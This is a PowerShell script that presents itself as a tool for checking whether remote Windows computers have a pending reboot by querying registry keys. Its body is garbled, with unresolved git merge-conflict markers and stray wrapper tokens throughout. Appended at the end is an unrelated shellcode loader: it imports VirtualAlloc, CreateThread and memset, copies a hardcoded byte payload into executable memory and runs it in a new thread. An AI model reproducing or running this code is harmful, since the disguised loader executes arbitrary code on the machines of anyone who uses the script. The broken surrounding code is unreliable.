

[CmdletBinding()]
param(
    [Parameter(Mandatory)]
    [ValidateNotNullOrEmpty()]
    [string[]]$ComputerName,
	
    [Parameter()]
    [ValidateNotNullOrEmpty()]
    [pscredential]$Credential
)

 -||-> <<<<<<< HEAD <-||- 
 -||-> $ErrorActionPreference = 'Stop' <-||- 

 -||-> $scriptBlock = {
     -||-> function Test-RegistryKey {
        [OutputType('bool')]
        [CmdletBinding()]
        param
        (
            [Parameter(Mandatory)]
            [ValidateNotNullOrEmpty()]
            [string]$Key
        )
 -||-> ======= <-||- 
    
     -||-> $remoteScriptblock = {

         -||-> function Test-RegistryKey {
            [OutputType('bool')]
            [CmdletBinding()]
            param
            (
                [Parameter(Mandatory)]
                [ValidateNotNullOrEmpty()]
                [string]$Key
            )
 -||-> >>>>>>> dcce019b814013fc8a33b17fd7f2b8a92a5251ce <-||- 
    
             -||-> $ErrorActionPreference = 'Stop' <-||- 

 -||-> <<<<<<< HEAD <-||- 
         -||-> if ( -||-> Get-Item -Path $Key -ErrorAction Ignore <-||- ) {
             -||-> $true <-||- 
 -||-> ======= <-||- 
             -||-> if ( -||-> Get-Item -Path $Key -ErrorAction Ignore <-||- ) {
                 -||-> $true <-||- 
            } <-||- 
 -||-> >>>>>>> dcce019b814013fc8a33b17fd7f2b8a92a5251ce <-||- 
        } <-||- 

 -||-> <<<<<<< HEAD <-||- 
     -||-> function Test-RegistryValue {
        [OutputType('bool')]
        [CmdletBinding()]
        param
        (
            [Parameter(Mandatory)]
            [ValidateNotNullOrEmpty()]
            [string]$Key,

            [Parameter(Mandatory)]
            [ValidateNotNullOrEmpty()]
            [string]$Value
        )
 -||-> ======= <-||- 
         -||-> function Test-RegistryValue {
            [OutputType('bool')]
            [CmdletBinding()]
            param
            (

                [Parameter(Mandatory)]
                [ValidateNotNullOrEmpty()]
                [string]$Key,

                [Parameter(Mandatory)]
                [ValidateNotNullOrEmpty()]
                [string]$Value
            )
 -||-> >>>>>>> dcce019b814013fc8a33b17fd7f2b8a92a5251ce <-||- 
    
             -||-> $ErrorActionPreference = 'Stop' <-||- 

 -||-> <<<<<<< HEAD <-||- 
         -||-> if ( -||-> Get-ItemProperty -Path $Key -Name $Value -ErrorAction Ignore <-||- ) {
             -||-> $true <-||- 
 -||-> ======= <-||- 
             -||-> if ( -||-> Get-ItemProperty -Path $Key -Name $Value -ErrorAction Ignore <-||- ) {
                 -||-> $true <-||- 
            } <-||- 
 -||-> >>>>>>> dcce019b814013fc8a33b17fd7f2b8a92a5251ce <-||- 
        } <-||- 

 -||-> <<<<<<< HEAD <-||- 
     -||-> function Test-RegistryValueNotNull {
        [OutputType('bool')]
        [CmdletBinding()]
        param
        (
            [Parameter(Mandatory)]
            [ValidateNotNullOrEmpty()]
            [string]$Key,

            [Parameter(Mandatory)]
            [ValidateNotNullOrEmpty()]
            [string]$Value
        )
 -||-> ======= <-||- 
         -||-> function Test-RegistryValueNotNull {
            [OutputType('bool')]
            [CmdletBinding()]
            param
            (

                [Parameter(Mandatory)]
                [ValidateNotNullOrEmpty()]
                [string]$Key,

                [Parameter(Mandatory)]
                [ValidateNotNullOrEmpty()]
                [string]$Value
            )
 -||-> >>>>>>> dcce019b814013fc8a33b17fd7f2b8a92a5251ce <-||- 
    
             -||-> $ErrorActionPreference = 'Stop' <-||- 

 -||-> <<<<<<< HEAD <-||- 
         -||-> if ( -||-> ( -||-> $regVal =  -||-> Get-ItemProperty -Path $Key -Name $Value -ErrorAction Ignore <-||-  <-||- ) -and $regVal.( -||-> $Value <-||- ) <-||- ) {
             -||-> $true <-||- 
 -||-> ======= <-||- 
             -||-> if ( -||-> ( -||-> $regVal =  -||-> Get-ItemProperty -Path $Key -Name $Value -ErrorAction Ignore <-||-  <-||- ) -and $regVal.( -||-> $Value <-||- ) <-||- ) {
                 -||-> $true <-||- 
            } <-||- 
 -||-> >>>>>>> dcce019b814013fc8a33b17fd7f2b8a92a5251ce <-||- 
        } <-||- 

         -||-> $tests = @(
             -||-> {  -||-> Test-RegistryKey -Key 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootPending' <-||-  } <-||- 
             -||-> {  -||-> Test-RegistryKey -Key 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootInProgress' <-||-  } <-||- 
             -||-> {  -||-> Test-RegistryKey -Key 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\RebootRequired' <-||-  } <-||- 
             -||-> {  -||-> Test-RegistryKey -Key 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Component Based Servicing\PackagesPending' <-||-  } <-||- 
             -||-> {  -||-> Test-RegistryKey -Key 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\PostRebootReporting' <-||-  } <-||- 
             -||-> {  -||-> Test-RegistryValueNotNull -Key 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' -Value 'PendingFileRenameOperations' <-||-  } <-||- 
             -||-> {  -||-> Test-RegistryValueNotNull -Key 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' -Value 'PendingFileRenameOperations2' <-||-  } <-||- 
             -||-> {
                 -||-> ( -||-> Test-RegistryKey -Key 'HKLM:\SOFTWARE\Microsoft\Updates' <-||- ) -and 
                ( -||-> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Updates' -Name 'UpdateExeVolatile' -ErrorAction Ignore | Select-Object -ExpandProperty UpdateExeVolatile <-||- ) -ne 0 <-||- 
            } <-||- 
             -||-> {  -||-> Test-RegistryValue -Key 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' -Value 'DVDRebootSignal' <-||-  } <-||- 
             -||-> {  -||-> Test-RegistryKey -Key 'HKLM:\SOFTWARE\Microsoft\ServerManager\CurrentRebootAttemps' <-||-  } <-||- 
             -||-> {  -||-> Test-RegistryValue -Key 'HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon' -Value 'JoinDomain' <-||-  } <-||- 
             -||-> {  -||-> Test-RegistryValue -Key 'HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon' -Value 'AvoidSpnSet' <-||-  } <-||- 
             -||-> {
                 -||-> ( -||-> Test-RegistryValue -Key 'HKLM:\SYSTEM\CurrentControlSet\Control\ComputerName' -Value 'ActiveComputerName' <-||- ) -and
                ( -||-> Test-RegistryValue -Key 'HKLM:\SYSTEM\CurrentControlSet\Control\ComputerName' -Value 'ComputerName' <-||- ) -and
                (
                     -||-> ( -||-> Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\ComputerName' -Name 'ActiveComputerName' <-||- ).ActiveComputerName -ne
                    ( -||-> Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\ComputerName' -Name 'ActiveComputerName' <-||- ).ComputerName <-||- 
                ) <-||- 
            } <-||- 
             -||-> {
                 -||-> $knownFalsePositiveGuids = @( -||-> '117cab2d-82b1-4b5a-a08c-4d62dbee7782' <-||- ) <-||- 
                 -||-> if ( -||-> Get-ChildItem -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Services\Pending' | Where-Object {  -||-> $_.PSChildName -notin $knownfalsepositiveguids <-||-  } <-||- ) {
                     -||-> $true <-||- 
                } <-||- 
            } <-||- 
        ) <-||- 

         -||-> foreach ($test in  -||-> $tests <-||- ) {
             -||-> if ( -||-> & $test <-||- ) {
                 -||-> $true <-||- 
                return
            } <-||- 
        } <-||- 
 -||-> <<<<<<< HEAD <-||-  <-||-  <-||-  <-||-  <-||-  <-||-  <-||-  <-||-  <-||- 
    )

     -||-> foreach ($test in  -||-> $tests <-||- ) {
         -||-> if ( -||-> & $test <-||- ) {
             -||-> $true <-||- 
            break
        } <-||- 
 -||-> ======= <-||- 
        
         -||-> $false <-||- 
 -||-> >>>>>>> dcce019b814013fc8a33b17fd7f2b8a92a5251ce <-||- 
    } <-||- 
}

 -||-> foreach ($computer in  -||-> $ComputerName <-||- ) {
    try {
         -||-> $connParams = @{ <-||- 
<<<<<<< HEAD
             -||-> 'ComputerName' = $computer <-||- 
 -||-> ======= <-||- 
             -||-> 'ComputerName' = $ComputerName <-||- 
 -||-> >>>>>>> dcce019b814013fc8a33b17fd7f2b8a92a5251ce <-||- 
        }
         -||-> if ( -||-> $PSBoundParameters.ContainsKey('Credential') <-||- ) {
             -||-> $connParams.Credential = $Credential <-||- 
        } <-||- 

 -||-> <<<<<<< HEAD <-||- 
         -||-> $output = @{
            ComputerName    =  -||-> $computer <-||- 
            IsPendingReboot =  -||-> $false <-||- 
        } <-||- 

         -||-> $psRemotingSession =  -||-> New-PSSession @connParams <-||-  <-||- 
        
         -||-> if ( -||-> -not ( -||-> $output.IsPendingReboot =  -||-> Invoke-Command -Session $psRemotingSession -ScriptBlock $scriptBlock <-||-  <-||- ) <-||- ) {
             -||-> $output.IsPendingReboot = $false <-||- 
 -||-> ======= <-||- 
         -||-> $results =  -||-> Invoke-Command @connParams -ScriptBlock $remoteScriptblock <-||-  <-||- 
         -||-> foreach ($result in  -||-> $results <-||- ) {
             -||-> $output = @{
                ComputerName    =  -||-> $result.PSComputerName <-||- 
                IsPendingReboot =  -||-> $result <-||- 
            } <-||- 
             -||-> [pscustomobject]$output <-||- 
 -||-> >>>>>>> dcce019b814013fc8a33b17fd7f2b8a92a5251ce <-||- 
        } <-||- 
         -||-> [pscustomobject]$output <-||- 
    } <-||-  catch  -||-> {
         -||-> Write-Error -Message $_.Exception.Message <-||- 
    } <-||- 
} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xb8,0xc4,0xea,0xac,0xc3,0xdb,0xdc,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x46,0x0f,0x03,0x46,0xcb,0x08,0x59,0x3f,0x3b,0x4e,0xa2,0xc0,0xbb,0x2f,0x2a,0x25,0x8a,0x6f,0x48,0x2d,0xbc,0x5f,0x1a,0x63,0x30,0x2b,0x4e,0x90,0xc3,0x59,0x47,0x97,0x64,0xd7,0xb1,0x96,0x75,0x44,0x81,0xb9,0xf5,0x97,0xd6,0x19,0xc4,0x57,0x2b,0x5b,0x01,0x85,0xc6,0x09,0xda,0xc1,0x75,0xbe,0x6f,0x9f,0x45,0x35,0x23,0x31,0xce,0xaa,0xf3,0x30,0xff,0x7c,0x88,0x6a,0xdf,0x7f,0x5d,0x07,0x56,0x98,0x82,0x22,0x20,0x13,0x70,0xd8,0xb3,0xf5,0x49,0x21,0x1f,0x38,0x66,0xd0,0x61,0x7c,0x40,0x0b,0x14,0x74,0xb3,0xb6,0x2f,0x43,0xce,0x6c,0xa5,0x50,0x68,0xe6,0x1d,0xbd,0x89,0x2b,0xfb,0x36,0x85,0x80,0x8f,0x11,0x89,0x17,0x43,0x2a,0xb5,0x9c,0x62,0xfd,0x3c,0xe6,0x40,0xd9,0x65,0xbc,0xe9,0x78,0xc3,0x13,0x15,0x9a,0xac,0xcc,0xb3,0xd0,0x40,0x18,0xce,0xba,0x0c,0xed,0xe3,0x44,0xcc,0x79,0x73,0x36,0xfe,0x26,0x2f,0xd0,0xb2,0xaf,0xe9,0x27,0xb5,0x85,0x4e,0xb7,0x48,0x26,0xaf,0x91,0x8e,0x72,0xff,0x89,0x27,0xfb,0x94,0x49,0xc8,0x2e,0x3a,0x1a,0x66,0x81,0xfb,0xca,0xc6,0x71,0x94,0x00,0xc9,0xae,0x84,0x2a,0x00,0xc7,0x2f,0xd0,0xc2,0x28,0x07,0xdb,0x11,0xc1,0x5a,0xdc,0x14,0xaa,0xd2,0x3a,0x7c,0xdc,0xb2,0x95,0xe8,0x45,0x9f,0x6e,0x89,0x8a,0x35,0x0b,0x89,0x01,0xba,0xeb,0x47,0xe2,0xb7,0xff,0x3f,0x02,0x82,0xa2,0xe9,0x1d,0x38,0xc8,0x15,0x88,0xc7,0x5b,0x42,0x24,0xca,0xba,0xa4,0xeb,0x35,0xe9,0xbf,0x22,0xa0,0x52,0xd7,0x4a,0x24,0x53,0x27,0x1d,0x2e,0x53,0x4f,0xf9,0x0a,0x00,0x6a,0x06,0x87,0x34,0x27,0x93,0x28,0x6d,0x94,0x34,0x41,0x93,0xc3,0x73,0xce,0x6c,0x26,0x82,0x32,0xbb,0x0e,0xf0,0x5a,0x7f <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



